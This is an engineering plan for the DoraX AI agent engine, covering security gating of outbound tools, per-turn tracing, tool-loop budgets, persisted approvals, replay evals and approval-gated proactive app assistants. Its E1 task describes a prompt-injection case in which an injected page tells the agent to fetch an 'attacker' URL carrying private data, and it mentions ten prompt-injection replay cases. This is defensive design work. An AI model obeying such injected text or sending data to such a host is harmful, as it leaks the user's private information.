# 00 — AI Engine Plan: make the agent safe, measurable and cheaper before 1.0

> **Status: ACCEPTED by the owner 2026-10-01 (option A).** The engine half of the plan:
> how one AI turn is guarded, measured and improved. The product, code layout and workflow
> stay in [`DORAX-BLUEPRINT.md`](DORAX-BLUEPRINT.md); the order of work stays in
> [`00-NOW.md`](00-NOW.md). This file never sets the order — it defines the tasks.
> Checked against `general-chat-agent` @ `c8f3acd` (2026-10-01).
> Tags: `[code]` true in the repo today · `[judgment]` recommendation · `[guess]` to be measured.
>
> **2026-10-27 architecture update (#327):** E9/E19 now implement the App Pets memory model and
> Combined Chat orchestration described in the
> [canonical design](../superpowers/specs/2026-10-27-app-pets-combined-chat-design.md). The engine
> remains one shared harness; no Pet owns a separate model loop.

---

## 1. Scope

- **1.0:** E1–E8c below. They harden what already ships (`DORAX-BLUEPRINT.md` Part 1:
  "app-scoped and cross-app AI with verified actions").
- **Labs, after 1.0:** E9–E16 (memory, model policy, retrieval, graph). `DORAX-BLUEPRINT.md`
  puts the memory vault and workers in Labs; these follow it.
- **Not in this plan:** new surfaces, UI work, the Dock → Corner move.

## 2. Rules every engine task follows

1. The model proposes; the host decides. A model's choice is never permission.
2. Recheck the state at the moment of acting; a choice made on an old state is rejected.
3. Every action gets a receipt; every choice gets a decision record, including declines and fallbacks.
4. Every loop has a named stop rule and a budget (rounds, tokens, seconds).
5. Text the user did not write is untrusted, and it taints the turn (E1).
6. One implementation per concern.
7. No engine change merges without a test that would have caught the bug.

## 3. Baseline — what the code does today (updated 2026-11-09)

| Area | Today | Evidence |
|---|---|---|
| Untrusted content & outbound gate | Fenced in prompts (`UntrustedContent.fenced`); `OutboundGate.decide` asks before any outbound tool when a turn holds private data + untrusted content (E1/E1b/E1c) | `[code]` `AI/OutboundGate.swift`, `AI/UntrustedContent.swift`, `AI/ReadingTools.swift` (#149, #165, #187) |
| Approval levels | `.medium`, `.high`, `.critical` all require approval (`.critical` hard-denied at `AICapabilityRegistry.swift:928`) | `[code]` `AI/AICapabilityRegistry.swift` (#44 closed) |
| Question vs action | A question is answered, never offered as an action | `[code]` `AI/ScopedRoutePolicy.swift`, `Context-DockTests/QuestionNotAnOfferTests.swift` |
| Read-back | A read-back that disagrees fails the step | `[code]` #139 / PR #142 |
| Prompt order | Stable sections first (`sourceRule` … `cli`), volatile sections last (`workspace` … `memory`); dual `<!-- cache:breakpoint -->` markers (E3) | `[code]` `AI/ScopedPromptAssembler.swift`, `AI/AnthropicPromptCache.swift` (#151 / PR #382) |
| Tool loops | Unified generic `runToolLoop<A: ToolLoopAdapter>` across OpenAI, Anthropic, Gemini; single `ToolLoopBudget.maxTokens(for:)` table; 2-round no-progress stop (E6a, E6b) | `[code]` `AI/Providers/AIProviderToolLoops.swift`, `AI/ToolLoopAdapter.swift` (#154 / PR #383, #155 / PR #389) |
| Tool budget & focus | On-device 8 tools, others 40; per-round `TurnFocus` (`inspect` / `act` / `verify` / `answer`) narrows tools sent per round (E7a) | `[code]` `AI/AIToolBudget.swift` (#156 / PR #390) |
| On-device chat | `sendToOnDevice` takes `history` and never uses it; errors are returned as answer text; no `exceededContextWindowSize` handling (queued: E5a #152, E5b #153) | `[code]` `AI/AIProviderService.swift` |
| On-device tools | A new `LanguageModelSession` on every call; image input falls back to Vision OCR (queued: #152, #397) | `[code]` `Services/OnDeviceToolBridge.swift` |
| Observability | Opt-in `turns.log` + per-turn OTel `turn.trace {json}` (`TurnRecorder.swift`, E2); token ledger per provider per day | `[code]` `Services/DoraXTurnLog.swift`, `Services/TurnRecorder.swift`, `AI/AITokenLedger.swift` (#150 / PR #170) |
| Approvals | Persisted across app restarts in `Application Support/Context-Dock/pending-approvals.json` with idempotency receipts and 10-min stale expiry (E7b) | `[code]` `AI/PendingApprovalJournal.swift`, `AI/ApprovalCenter.swift` (#157 / PR #391) |
| Evals | 359 offline test files; retrieval benchmark (hit@5, MRR); offline `ReplayCaseStore`, `ReplayRunner`, and heuristic `ReplayCaseJudge` (E8a–E8c) | `[code]` `Services/ReplayCase*.swift`, `Services/ReplayRunner.swift`, `Context-DockTests/` (#158–#160 / PRs #392–#394) |

## 4. Tasks for 1.0

Sizes follow the issue rule: S ≤ ½ day, M ≤ 2 days, L is split.

| # | Task | Status | Done when | Lane | Size | After |
|---|---|---|---|---|---|---|
| **E1** #149 | Security gate: once a turn holds private data and untrusted content, outbound tools ask first (+ E1b #165, E1c #187) | ✅ Merged (#164, #175, #187) | An injected page asking `read_url` for `https://attacker/?d=…` raises an approval card; a URL the user typed in the thread still runs; offline tests cover both | `AI/OutboundGate`, `AI/UntrustedContent`, `AI/ApprovalCenter` | M | — |
| **E2** #150 | Recorder: per-turn trace in the turn log | ✅ Merged (#170) | One record per turn: tools sent vs called, rounds, tokens per round, cache-read tokens, characters per prompt section, verifier fires, latency; OpenTelemetry GenAI field names; still opt-in | `Services/TurnRecorder`, `AI/Providers` | M | — |
| **E3** #151 | Prompt order: stable first, a second cache mark, volatile last | ✅ Merged (#382) | E2 shows the cache-read ratio rising on multi-turn Anthropic threads; offline suite green | `AI/ScopedPromptAssembler`, `AI/AnthropicPromptCache` | S | E2 |
| E4 | ~~One "question or action?" gate~~ | ✅ Done | **Done before this plan** — `ScopedRoutePolicy`, `QuestionNotAnOfferTests` | — | — | — |
| **E5a** #152 | On-device: keep history, survive overflow, typed errors | ⏸ Needs owner E5 answer | A 10-turn on-device chat uses a fact from turn 2; `exceededContextWindowSize` → condense the transcript, new session, retry once; failures are errors, never answer text | `AI/AIProviderService`, `Services/OnDeviceToolBridge` | M | — |
| **E5b** #153 | On-device: budget with `tokenCount` before sending | ⏸ Queued after E5a | No overflow on the E5a test set | same | S | E5a |
| **E6a** #154 | Tool loop: no-progress stop + one max_tokens table | ✅ Merged (#383) | Two rounds with nothing new end the loop; per-provider limits in one table | `AI/Providers/AIProviderToolLoops` | S | E2 |
| **E6b** #155 | Tool loop: three loops become one | ✅ Merged (#389) | Adapters only translate request/response formats; offline suite green; no behaviour change in the E2 trace | `AI/ToolLoopAdapter` | M | E6a |
| **E7a** #156 | Focus: inspect / act / verify / answer each send their own tool set | ✅ Merged (#390) | Tools sent per round drop in the E2 trace; "answer" sends none | `AI/AgentToolRegistry`, `AI/AIToolBudget` | M | E6b |
| **E7b** #157 | Approvals survive quitting the app | ✅ Merged (#391) | A pending approval reappears after relaunch and the turn continues or is cleanly cancelled | `AI/PendingApprovalJournal` | M | — |
| **E8a** #158 | Replay cases: record query, context and tool outputs from real turns | ✅ Merged (#392) | 50 cases on disk, private data stripped | `Services/ReplayCase*`, tests | M | E2; test host #65, #75, #77 |
| **E8b** #159 | Replay runner: rule checks + retrieval metrics, offline | ✅ Merged (#393) | One command prints the pass rate before and after a change; includes 10 prompt-injection cases | `Services/ReplayRunner`, `Context-DockTests/` | M | E8a |
| **E8c** #160 | Replay judge for answer quality | 🟡 Built (#394, heuristic; open for owner) | Judge scores agree with the owner's hand grades on 20 cases | `Services/ReplayCaseJudge`, tests | S | E8b |

Each task is one GitHub issue (#149–#160), created **without** the `ready` label. The builder only
takes `ready` issues, so nothing starts until the owner labels one.

## 5. Labs & App Pets stages

| # | Task | Status | Notes |
|---|---|---|---|
| E9 | Three-tier memory: active provider context + full local transcript/rolling thread summary + verified per-Pet long memory | ✅ Merged (#340 / PR #361) | `AppPetMemoryController`, `CombinedWorkspaceMemory`, `ConversationMemoryProjector` |
| E9a | Context-limit UX | ✅ Merged (#340 / PR #361) | Near a provider limit offer Keep active (condense), Archive and new chat, or New chat without saving memory; local transcript remains intact |
| E9b | Pet modes (`/mods`) | ✅ Merged (#341 / PR #362) | `AppPetManifest`, `AppPetModeCommand`; mode overlays instructions/tool emphasis/output shape inside the same thread; never changes scope, risk, approval or provider budgets |
| E10 | Model policy per turn: privacy, availability, complexity; the user's setting is the ceiling | Queued (Labs) | Folds in #70 (privacy routing settings) |
| E11 | Parallel read tools | Queued (Labs) | Measured with E2 |
| E12 | Finish the capability index migration; retire old routers one at a time | In progress (#204) | `AI/CapabilityIndexShadow.swift`; #55, #57, #204 |
| E13 | Hybrid retrieval: `NLEmbedding` + reciprocal rank fusion (k = 60) | Queued (Labs) | Ships only if hit@5 and MRR improve on E8 cases |
| E14 | Graph gate: 30 real multi-hop questions from the turn log | Queued (Labs) | No graph without them |
| E15 | Knowledge graph: typed edges from receipts in SQLite + `graph_neighbors` | Queued (Labs) | Replaces the dashboard-only `KnowledgeGraph` |
| E16 | Nightly consolidation: dedupe facts, rebuild graph and embeddings | Queued (Labs) | Extends `Services/BrainMaintenance.swift` |
| E17 | Import the `SKILL.md` / `--help` of CLIs the user installed into the capability index | ✅ Merged (P8 #202 / PR #309) | Never bundled or installed by DoraX; every write command asks; after E1b (#165) |
| E18 | Watch mode (= E19 layer 4): a scope notices things while you are away and leaves one suggestion | ✅ Merged (#343 / PR #366) | `AppPetProactivity.swift`, `HeadlessMonitoringBudgetTracker`, off by default per Pet |
| E19 | **App Assistant**: each app scope becomes a personal assistant for that app — remembers you, learns your routines, briefs you when you arrive, says what changed after an update | Stages 1–6 shipped (#338–#343); solved skills extending via #405–#413 | Plan in §5b and `2026-11-09-agent-harness-model.md` |

### 5b. E19 App Assistant — the plan (owner confirmed 2026-10-04)

**Goal.** Every app scope (Finder, Mail, Safari, any app) becomes an App Pet: it knows how *you*
use that app, offers the next step before you ask, and tells you what changed—inside the one Dock
or a detached presentation backed by the same scope/store. Inspired by OpenAI Dots, built the
DoraX way: local, read-only when proactive, approval to act.

**Today vs. target.** Today a scope is smart only when asked: it reads the app (menus, Help menu, data readers) and acts with approval. It forgets your habits between threads and never speaks first.

**Four layers** (each needs the one before):

| Layer | What the owner sees | Works for | Built on |
|---|---|---|---|
| 1. Remembers you | Finder knows invoices go to `~/Documents/Invoices`; Mail knows who you answer fast. A "What I know about you here" list in the app's ⚙ card — every fact can be deleted | Every app | E9 memory, keyed by app |
| 2. Learns routines | "You usually Export PDF, then email it to Sam — do both?" as one tap | Every app, even menu-only ones | Receipts (E7b) + saved workflows |
| 3. Briefs you on arrival | One quiet line in the scope's strip when the app comes to the front: "Downloads has 40 new files — tidy?", "2 unread from people you answer within the hour", "Figma updated to 125.3 — 4 new commands" | Apps whose data DoraX can read (Finder, Safari, Mail, Calendar, Notes, Reminders); the "what's new" line works for every app | Read-only checks at app switch; menu diff between versions |
| 4. Watches while away | "The pricing page you saved changed" | Watchable apps only (E18) | E18 |

**App updates** (part of layer 3):
- Re-learn an app when its version changes *while DoraX runs*, not only at DoraX start (`AppKnowledgeSkillRefresher` runs today only when adapters load).
- On a version change, keep the owner's edits to the app's knowledge page (merge, never replace).
- "What's new": diff the menu cache of the old and new version (`AppMenuCapabilityCache` is already keyed by `bundleVersion`); show it once.
- Not built: checking the internet for *available* updates of other apps — it would send the owner's app list out past the gate; macOS already does it.

**Rules** (all layers):
1. No new engine or custom shell—a detached Pet is a presentation of the existing Dock scope and
   stores (Unified Dock Surface rule).
2. Proactive = read-only; any write waits for the owner through the same card and gate; an approved write runs once (E7b).
3. Interruption budget: at most one briefing per app switch, a few per day; off per app until switched on; an ignored suggestion type is learned and goes quiet.
4. Memory is visible and editable per app; nothing learned leaves the Mac.
5. Measured: every suggestion is traced (E2); an app whose suggestions are accepted less than an agreed share goes quiet; E8 replays guard quality.
6. `/mods` changes behavior, never permission. Cross-app work connects the required Pet and becomes
   Combined Chat; connecting it is not action approval.

**Prerequisites:** E1b (#165), #177 (a choice list never acts in the same turn), E7b (#157), E8 (replays), E9 (memory). Proactivity on top of wrong routing multiplies wrong guesses, so these land first.

**Phases** (each its own issue when the queue reaches it; each ends with an owner hand check):

| Phase | Scope | Done when |
|---|---|---|
| E19a | Layer 1 for Finder + Mail; ⚙ card shows and deletes facts | Facts learned in one thread are used in the next; deleting a fact stops its use (tests + hand check) |
| E19b | Layer 3 for Finder + Mail, plus "what's new after an update" for every app; live re-learn on version change; owner edits survive | Briefing appears once per switch within budget; version bump shows the menu diff once; edits kept (tests + hand check) |
| E19c | Two weeks of measured use | Acceptance per suggestion type reported from E2 traces; owner decides what expands |
| E19d | Layer 2 (routines) for every app; layers 1/3 for Safari, Calendar, Notes | Same tests per app; parity in Dock and Corner |
| E19e | Layer 4 = E18, Finder first | E18 rules hold; owner hand check |

### Watch mode rules (from OpenAI Dots, owner 2026-10-04)

OpenAI's Dots (2026-09-30) are always-on cloud agents that look for work on their own. DoraX scopes are not that today: they act only when asked. If DoraX adds background work (E18), it follows the rules that make Dots safe:

1. **Background is read-only.** A watch may read (list folders, read pages, count files); it never writes, sends, fetches a new host or drives the screen. The gate (E1/E1b) blocks anything else.
2. **Acting waits for the owner.** A watch ends in one suggestion ("3 duplicate PDFs in Downloads — move to Trash?"); the write runs only after approval, through the same card and receipt as a chat turn (E7b: an approved write runs once).
3. **Interruption budget.** At most a few suggestions a day per scope, none while the owner is typing or in a call; off by default, one switch per scope.
4. **Local first.** Watches run on the Mac (`FileSystemWatcher`, Safari's tab reader), never in a cloud sandbox; nothing leaves the Mac without the gate.
5. **Recorded.** Every watch run writes a trace (E2) so E8 can measure whether suggestions were accepted.

## 6. Order the owner chose (2026-10-01) — for the planner to apply in `00-NOW.md`

This file does not edit `00-NOW.md`; the cloud planner keeps the order there. Proposed lines:

```
Owner decisions
| 2026-10-01 | AI engine plan accepted: docs/master/00-AI-ENGINE-PLAN.md. E1–E8c are 1.0; E9–E16 are Labs. |
| 2026-10-01 | Security first: E1 runs next. #134 stays needs-owner. #44 closed (fixed in f2d3d5f). |
| 2026-10-01 | On-device fixes (E5a, E5b) are 1.0: on-device chat ships today and loses its history. |

Next, in order
1. #149 E1 Security gate
2. #150 E2 Recorder
3. #151 E3 Prompt order · #152 E5a → #153 E5b On-device
4. #154 E6a → #155 E6b → #156 E7a · #157 E7b
5. #158 E8a → #159 E8b → #160 E8c
```

## 7. How a task moves

Engine planner (cloud, branch `claude/ai-engine-plan`) writes or updates the issue →
cloud planner sets the order in `00-NOW.md` → owner labels the next issue `ready` →
builder (`/loop /builder`, on the Mac) builds and tests it on its own branch from
`general-chat-agent` → engine planner reviews the PR against this file → owner hand-checks
and says "merge <n>" → this file's baseline (§3) is updated in the next docs PR.

Cloud sessions cannot build or test the app (Linux, no Xcode). Code is built only by the builder.

## 8. Study copy

The diagrams and reasoning behind this plan (the 17-step turn, memory tiers, loops) are in
the owner's "DoraX Master Blueprint" doc. This file is the source of truth for the tasks.
